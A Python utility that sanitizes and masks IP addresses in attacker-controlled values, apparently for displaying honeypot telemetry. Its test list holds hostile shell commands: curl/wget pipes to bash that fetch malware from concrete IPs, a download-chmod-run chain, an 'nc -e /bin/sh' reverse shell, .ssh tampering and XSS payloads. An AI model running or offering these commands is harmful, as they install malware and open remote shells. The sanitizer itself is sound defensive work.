import html
import ipaddress
import re

_IPV4_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")

_IPV6_CANDIDATE_RE = re.compile(
    r"(?<![\w:])[0-9A-Fa-f:]+(?:%[0-9A-Za-z_.-]+)?(?![\w:])"
)


def _mask_ip(value: str) -> str:
    try:
        ip = ipaddress.ip_address(value)
    except ValueError:
        return value

    if ip.version == 4:
        parts = value.split(".")
        return f"{parts[0]}.{parts[1]}.x.x"

    # IPv6: preserve the first 4 hextets from the canonical address.
    hextets = ip.exploded.split(":")
    prefix = ":".join(hextets[:4])

    # Remove leading zeroes for readability.
    prefix = ":".join(part.lstrip("0") or "0" for part in prefix.split(":"))

    return f"{prefix}::x"


def _mask_ipv4(match: re.Match[str]) -> str:
    return _mask_ip(match.group(0))


def _mask_ipv6_candidates(value: str) -> str:
    def replace(match: re.Match[str]) -> str:
        candidate = match.group(0)

        if ":" not in candidate:
            return candidate

        return _mask_ip(candidate)

    return _IPV6_CANDIDATE_RE.sub(replace, value)


def sanitize_display_value(
    value: str,
    *,
    max_length: int = 200,
) -> str:
    """Sanitize an attacker-controlled value for public display."""

    if not isinstance(value, str):
        value = str(value)

    # Remove control characters and normalize whitespace.
    value = "".join(char if char.isprintable() else " " for char in value)
    value = re.sub(r"\s+", " ", value).strip()

    # Mask IPv4 addresses.
    value = _IPV4_RE.sub(_mask_ipv4, value)

    # Mask IPv6 addresses, including compressed forms such as ::1.
    value = _mask_ipv6_candidates(value)

    # Limit the length of attacker-controlled values.
    if len(value) > max_length:
        value = value[: max_length - 1] + "…"

    return value


def main() -> None:
    test_values = [
        "uname -a",
        "curl http://1.2.3.4/payload.sh | bash",
        "wget http://192.168.100.55:8080/malware.sh",
        "<script>alert('hello')</script>",
        "192.168.1.123",
        "2001:db8:1234:5678:abcd:ef01:2345:6789",
        "   uname    -a   ",
        "A" * 500,
        "1.2.3.4",
        "192.168.1.100:8080",
        "http://176.65.139.248/payload.sh",
        "curl 10.0.0.1 | bash",
        "2001:db8:1234:5678::1",
        # Event types
        "cowrie.session.connect",
        "cowrie.login.failed",
        "cowrie.command.input",
        "cowrie.login.success",
        # Commands
        "uname -a 2>/dev/null || echo 'Unknown'",
        "uname -a",
        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
        "lockr -ia .ssh",
        "cat /proc/cpuinfo | grep name | wc -l",
        "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
        "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
        "ls -lh $(which ls)",
        "crontab -l",
        "w",
        # Downloads / filenames
        "sshd",
        "clean.sh",
        "redtail.arm7",
        "redtail.arm8",
        "redtail.i686",
        "redtail.riscv",
        "redtail.x86_64",
        "setup.sh",
        "dota3.tar.gz",
        # Files
        "/root/.ssh/authorized_keys",
        "/etc/hosts.deny",
        "/home/ubuntu/.ssh/authorized_keys",
        "/home/admin/.ssh/authorized_keys",
        "/dev/shm/key.ppk",
        "/dev/shm/sshcfg",
        "/home/dev/.ssh/authorized_keys",
        "/home/user/.ssh/authorized_keys",
        # HASSH / SSH fingerprints
        "594c57870d0ec290ad3f328d5116eb18",
        "0a07365cc01fa9fc82608ba4019af499",
        "f555226df1963d1d3c09daf865abdc9a",
        # IPs / URLs similar to what appeared in the telemetry
        "http://176.65.139.228:6677/bins/x86",
        "http://176.65.139.228:6677/Exodus.sh",
        "http://176.65.139.228:6677/bins/mips",
        "http://176.65.139.228:6677/bins/mipsel",
        # Commands containing IP addresses
        "curl http://176.65.139.228:6677/bins/x86",
        "wget http://176.65.139.228:6677/Exodus.sh",
        "curl http://91.192.81.41:8080/wget.sh | sh",
        # Shell metacharacters / HTML
        "echo '<script>alert(1)</script>'",
        "curl http://176.65.139.228/payload.sh | bash",
        "wget http://192.168.100.55:8080/malware.sh",
        # Long-ish / suspicious input
        "cd /tmp && wget http://176.65.139.228:8080/redtail.x86_64 -O /tmp/redtail && chmod +x /tmp/redtail && /tmp/redtail",
        # IPv6
        "curl http://[2001:db8:1234:5678::1]:8080/payload.sh",
        "wget http://1.2.3.4:8080/setup.sh -O /tmp/setup.sh",
        "curl -o /tmp/clean.sh http://176.65.139.228/clean.sh",
        "echo '<img src=x onerror=alert(1)>'",
        "/tmp/run.sh 192.168.1.100:4444",
        "ssh root@192.168.1.100",
        "nc -e /bin/sh 10.0.0.1 4444",
        "abc192.168.1.100def",
        "hash-192.168.1.100-value",
        "version-1.2.3.4",
    ]

    for value in test_values:
        sanitized = sanitize_display_value(value)
        print(f"Original: {value}")
        print(f"Sanitized: {sanitized}")
        print()


if __name__ == "__main__":
    main()
